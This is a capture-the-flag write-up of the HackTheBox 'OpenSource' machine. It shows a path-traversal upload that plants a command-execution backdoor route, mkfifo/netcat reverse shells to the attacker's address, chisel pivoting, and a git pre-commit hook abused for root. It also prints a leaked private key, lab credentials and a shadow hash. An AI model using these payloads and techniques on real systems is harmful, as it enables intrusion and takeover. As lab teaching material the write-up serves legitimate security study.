# OpenSource - HackTheBox - Writeup
Linux, 20 Base Points, Easy

![info.JPG](images/info.JPG)

## Machine

![‏‏OpenSource.JPG](images/OpenSource.JPG)
 
## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```22```, ```80``` and ```3000```.

***User***: From the ```source.zip``` file we found ```dev01``` credentials on ```dev``` branch, According to the source code we create a new route to get RCE, Create a tunnel using ```chisel``` scan for port ```3000``` and we found it on ```172.17.0.1``` with ```Gitea```, Log in to ```Gitea``` using ```dev01``` credentials (from the ```dev``` branch) and we get the ```id_rsa``` of ```dev01``` user.

***Root***: By running ```pspy``` we found the ```root``` runs ```git commit``` command, Using ```Git Hooks``` pre-commit we add a reverse shell to the pre-commit script and we get a reverse shell as ```root```.

![pwn.JPG](images/pwn.JPG)


## OpenSource Solution

### User

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/OpenSource]
└──╼ $ nmap -sV -sC -oA nmap/OpenSource 10.10.11.164
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-03 15:00 IDT
Nmap scan report for 10.10.11.164
Host is up (0.18s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Fri, 03 Jun 2022 12:00:30 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Fri, 03 Jun 2022 12:00:30 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
3000/tcp filtered ppp

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

By observing port 80 we get the following web page:

![port80.JPG](images/port80.JPG)

By clicking on [Download](http://10.10.11.164/download) we get the following [source.zip](./source.zip) file.

If we are clicking on [Take me there!](http://10.10.11.164/upcloud) button we are navigated to the following web page:

![upcloud.JPG](images/upcloud.JPG)

After uploading a test file we get the following page:

![testupload.JPG](images/testupload.JPG)

Let's observe the source code to understand the flow.

On the file ```app/app/views.py``` we can see the following code:
```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

```send_report``` function calls to ```get_file_name``` function (from ```utils```) and then sending a file from the web server.

Let's observe ```get_file_name``` function on ```app/app/utils.py```:
```python
import time


def current_milli_time():
    return round(time.time() * 1000)


"""
Pass filename and return a secure version, which can then safely be stored on a regular file system.
"""


def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")


"""
TODO: get unique filename
"""


def get_unique_upload_name(unsafe_filename):
    spl = unsafe_filename.rsplit("\\.", 1)
    file_name = spl[0]
    file_extension = spl[1]
    return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension


"""
Recursively replace a pattern in a string
"""


def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

We can see the ```get_file_name``` function calls to ```recursive_replace``` to replace all ```../``` with ```""``` to prevent directory traversal.

We can see on also ```.git``` directory, Let's see which branches we have:
```console
┌─[evyatar@parrot]─[/hackthebox/OpenSource/source]
└──╼ $ git branch 
  dev
* public
┌─[evyatar@parrot]─[/hackthebox/OpenSource/source]
└──╼ $ git log
commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile for production use

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial

```

Let's check the ```dev``` branch:
```console
┌─[evyatar@parrot]─[/hackthebox/OpenSource/source]
└──╼ $  git checkout dev -f
Switched to branch 'dev'
┌─[evyatar@parrot]─[/hackthebox/OpenSource/source]
└──╼ $ git log
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -> dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -> dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial

```

By enumerating the commits we found credentials on ```a76f8f75f7a4a12b706b0cf9c983796fa1985820```:
```console
┌─[evyatar@parrot]─[/hackthebox/OpenSource/source]
└──╼ $ git checkout a76f8f75f7a4a12b706b0cf9c983796fa1985820 -f
Note: switching to 'a76f8f75f7a4a12b706b0cf9c983796fa1985820'.

┌─[evyatar@parrot]─[/hackthebox/OpenSource/source]
└──╼ $ cat ./app/.vscode/settings.json
{
  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
  "http.proxyStrictSSL": false
}
```

We can see the credentials ```dev01:Soulless_Developer#2022```.

According to the source code before, We can replace the file ```views.py``` with our file.

First, Let's create our ```views.py``` file with ```backdoor``` route:
```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
	
@app.route('/bd')
def bd():
    cmd=request.args.get('cmd')
    return os.system(cmd)
```

Let's upload our ```views.py``` file on [http://10.10.11.164/upcloud](http://10.10.11.164/upcloud), We need to intercept the request using Burp to change the ```filename``` from ```filename="views.py"``` to ```filename="..//app/app/views.py"``` as follow:
```HTTP
POST /upcloud HTTP/1.1
Host: 10.10.11.164
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------23613858511082285195442481844
Content-Length: 1016
Origin: http://10.10.11.164
DNT: 1
Connection: close
Referer: http://10.10.11.164/upcloud
Upgrade-Insecure-Requests: 1

-----------------------------23613858511082285195442481844
Content-Disposition: form-data; name="file"; filename="views.py"
Content-Type: text/x-python

import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

@app.route('/bd')
def bd():
    cmd=request.args.get('cmd')
    return os.system(cmd)


-----------------------------23613858511082285195442481844--


```

Because ```recursive_replace``` function replaces ```../``` with ```""``` so ```filename="..//app/app/views.py"``` will be ```filename="/app/app/views.py"``` and thats exactly what we need.

Let's test our backdoor:
```console
┌─[evyatar@parrot]─[/hackthebox/OpenSource]
└──╼ $ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes

```

Now, Let's send a PING request to our host by browsing to [http://10.10.11.164/bd?cmd=ping%20-c1%2010.10.14.14](http://10.10.11.164/bd?cmd=ping%20-c1%2010.10.14.14) and we get:
```console
┌─[evyatar@parrot]─[/hackthebox/OpenSource]
└──╼ $ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
13:35:26.577312 IP 10.10.14.14 > 10.10.11.164: ICMP echo reply, id 304, seq 14, length 64
13:35:27.581402 IP 10.10.11.164 > 10.10.14.14: ICMP echo request, id 304, seq 15, length 64
13:35:27.581466 IP 10.10.14.14 > 10.10.11.164: ICMP echo reply, id 304, seq 15, length 64
13:35:28.578196 IP 10.10.11.164 > 10.10.14.14: ICMP echo request, id 304, seq 16, length 64
13:35:28.578261 IP 10.10.14.14 > 10.10.11.164: ICMP echo reply, id 304, seq 16, length 64

```

Now we can get a reverse shell:
```console
┌─[evyatar@parrot]─[/hackthebox/OpenSource]
└──╼ $ sudo nc -lvp 4444
listening on [any] 4444 ...
```

Let's run the following command to get a reverse shell:
```console
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 4444 >/tmp/f
```

Endcode it:
```console
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.10.14.14%2080%20%3E%2Ftmp%2Ff
```

And browse it using ```curl```:
```console
┌─[evyatar@parrot]─[/hackthebox/OpenSource]
└──╼ $ curl "http://10.10.11.164/bd?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.10.14.14%204444%20%3E%2Ftmp%2Ff"
```

And we get:
```console
┌─[evyatar@parrot]─[/hackthebox/OpenSource]
└──╼ $ sudo nc -lvp 4444
listening on [any] 4444 ...
10.10.11.164: inverse host lookup failed: Unknown host
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.164] 36871
/bin/sh: can't access tty; job control turned off
/app/app # whoami
root

```

As we can see, We are inside a container.

By running ```arp -a``` we get the following hosts:
```console
/app/app # ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:07  
          inet addr:172.17.0.7  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:8277 errors:0 dropped:0 overruns:0 frame:0
          TX packets:5125 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:9326470 (8.8 MiB)  TX bytes:1194325 (1.1 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)


/app/app # arp -a
? (172.17.0.6) at 02:42:ac:11:00:06 [ether]  on eth0
? (172.17.0.9) at 02:42:ac:11:00:09 [ether]  on eth0
? (172.17.0.1) at 02:42:f2:dd:9b:77 [ether]  on eth0
```

We can see that we have the following hosts ```172.17.0.6,172.17.0.9,172.17.0.1```.

To make port scanning we need a tunnel, We can use [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) which is a fast TCP/UDP tunnel, transported over HTTP.

Let's download the [https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz) version and upload it into the target machine.

In our host, Let's run:
```console
┌─[evyatar@parrot]─[/hackthebox/OpenSource]
└──╼ $ ./chisel server -p 4445 --reverse 
2022/06/26 14:21:37 server: Reverse tunnelling enabled
2022/06/26 14:21:37 server: Fingerprint A3o69rYF7s9sPdbSaiyQ1IqhmCNONWLNt+tT3yxEY6M=
2022/06/26 14:21:37 server: Listening on http://0.0.0.0:4445

```

And on the target machine:
```console
/tmp # ./chisel client 10.10.14.14:4445 R:socks
2022/06/26 11:22:46 client: Connecting to ws://10.10.14.14:4445
2022/06/26 11:22:48 client: Connected (Latency 87.988274ms)
```

And we get session from the target machine:
```console
┌─[evyatar@parrot]─[/hackthebox/OpenSource]
└──╼ $ ./chisel server -p 4445 --reverse 
...
2022/06/26 14:22:47 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Let's configure the proxy on ```/etc/proxychains.conf```:
```console
...
[ProxyList]
socks4 127.0.0.1 1080
```

NOTE: You can read about chisel tunneling on [https://ap3x.github.io/posts/pivoting-with-chisel/](https://ap3x.github.io/posts/pivoting-with-chisel/).

On the ```nmap``` scanning we ran before we found port ```3000``` is open.

Let's try to find which container listens to this port:
```console
┌─[evyatar@parrot]─[/hackthebox/OpenSource]
└──╼ $ proxychains nc 172.17.0.1 3000 -z -v
ProxyChains-3.1 (http://proxychains.sf.net)
172.17.0.1: inverse host lookup failed: 
|D-chain|-<>-127.0.0.1:1080-<><>-172.17.0.1:3000-<><>-OK
(UNKNOWN) [172.17.0.1] 3000 (?) open : Operation now in progress
┌─[evyatar@parrot]─[/hackthebox/OpenSource]
└──╼ $ proxychains nc 172.17.0.6 3000 -z -v
ProxyChains-3.1 (http://proxychains.sf.net)
172.17.0.6: inverse host lookup failed: 
|D-chain|-<>-127.0.0.1:1080-<><>-172.17.0.6:3000-<--timeout
(UNKNOWN) [172.17.0.6] 3000 (?) : Connection refused
┌─[evyatar@parrot]─[/hackthebox/OpenSource]
└──╼ $ proxychains nc 172.17.0.9 3000 -z -v
ProxyChains-3.1 (http://proxychains.sf.net)
172.17.0.9: inverse host lookup failed: 
|D-chain|-<>-127.0.0.1:1080-<><>-172.17.0.9:3000-<--timeout
(UNKNOWN) [172.17.0.9] 3000 (?) : Connection refused
```

We can see it's open on ```172.17.0.1```, Let's use ```proxychains``` to open firefox and to browse to [http://172.17.0.1:3000/](http://172.17.0.1:3000/):

![gitea.JPG](images/gitea.JPG)

Regiter on [http://172.17.0.1:3000/user/sign_up](http://172.17.0.1:3000/user/sign_up):

![register.JPG](images/register.JPG)


By clicking on [Explore->Users](http://172.17.0.1:3000/explore/users) we get:

![users.JPG](images/users.JPG)

By logging in to ```dev01``` user with the credentials from the ```dev``` branch (```dev01:Soulless_Developer#2022```) we get:

![dev01.JPG](images/dev01.JPG)

We can see ```.ssh``` directory on [http://172.17.0.1:3000/dev01/home-backup/src/branch/main/.ssh](http://172.17.0.1:3000/dev01/home-backup/src/branch/main/.ssh):

![ssh.JPG](images/ssh.JPG)

```id_rsa``` of ```dev01``` contains:
```console
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

Let's use ```dev01``` SSH private key:
```console
┌─[evyatar@parrot]─[/hackthebox/OpenSource]
└──╼ $ ssh -i dev01_idrsa dev01@10.10.11.164
load pubkey "dev01_idrsa": invalid format
The authenticity of host '10.10.11.164 (10.10.11.164)' can't be established.
ECDSA key fingerprint is SHA256:a6VljAI6pLD7/108ls+Bi5y88kWaYI6+V4lTU0KQsQU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.164' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jun 26 19:50:24 UTC 2022

  System load:  0.44              Processes:              241
  Usage of /:   75.8% of 3.48GB   Users logged in:        0
  Memory usage: 26%               IP address for eth0:    10.10.11.164
  Swap usage:   0%                IP address for docker0: 172.17.0.1


16 updates can be applied immediately.
9 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Mon May 16 13:13:33 2022 from 10.10.14.23
dev01@opensource:~$ cat user.txt
36195a91ae4e74463454c52888fe509
```

And we get the user flag ```36195a91ae4e74463454c52888fe509```.

### Root

Let's run [pspy64](https://github.com/DominicBreuker/pspy) to monitor the running processes.

After a few minutes we can see the following:
```console
...
2022/06/26 20:04:01 CMD: UID=0    PID=11375  | /bin/bash /root/meta/app/clean.sh 
2022/06/26 20:04:01 CMD: UID=0    PID=11378  | git status --porcelain 
2022/06/26 20:04:01 CMD: UID=0    PID=11386  | git commit -m Backup for 2022-06-26 
2022/06/26 20:04:01 CMD: UID=0    PID=11387  | /bin/bash /usr/local/bin/git-sync 
2022/06/26 20:04:01 CMD: UID=0    PID=11388  | git push origin main 
...
``` 

We can see the root runs ```git commit``` command, We can use [Git Hooks](https://githooks.com/) to write ```pre-commit``` hook.

Every Git repository has a ```.git/hooks``` folder with a script for each hook we can bind to.

Let's add a pre-commit on ```/home/dev01/.git/hooks/pre-commit``` file (We can copy this file from ```/home/dev01/.git/hooks/pre-commit.sample```), We add ```ping``` command to POC:
```console
dev01@opensource:~/.git/hooks$ cat pre-commit
#!/bin/sh
ping -c1 10.10.16.5

```

And we get a ```ping```:
```console
┌─[evyatar@parrot]─[/hackthebox/OpenSource]
└──╼ $ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
23:14:01.486984 IP 10.10.11.164 > 10.10.14.14: ICMP echo request, id 14666, seq 1, length 64
23:14:01.487002 IP 10.10.14.14 > 10.10.11.164: ICMP echo reply, id 14666, seq 1, length 64

```

Now, Let's change the ```ping``` request to the following reverse shell:
```console
dev01@opensource:~/.git/hooks$ cat pre-commit
#!/bin/sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 4446 >/tmp/f
```

And we get a reverse shell:
```console
┌─[evyatar@parrot]─[/hackthebox/OpenSource]
└──╼ $ nc -lvp 4446
listening on [any] 4446 ...
10.10.11.164: inverse host lookup failed: Unknown host
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.164] 47800
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# pwd
/home/dev01
# cat /root/root.txt
d44173e61ad006def4f2feb5a4c454dc
```

And we get the root flag ```d44173e61ad006def4f2feb5a4c454dc```.

PDF password:
```console
# cat /etc/shadow | grep root | cut -d':' -f2
$6$5sA85UVX$HupltM.bMqXkLc269pHDk1lryc4y5LV0FPMtT3x.yUdbe3mGziC8aUXWRQ2K3jX8mq5zItFAkAfDgPzH8EQ1C/
```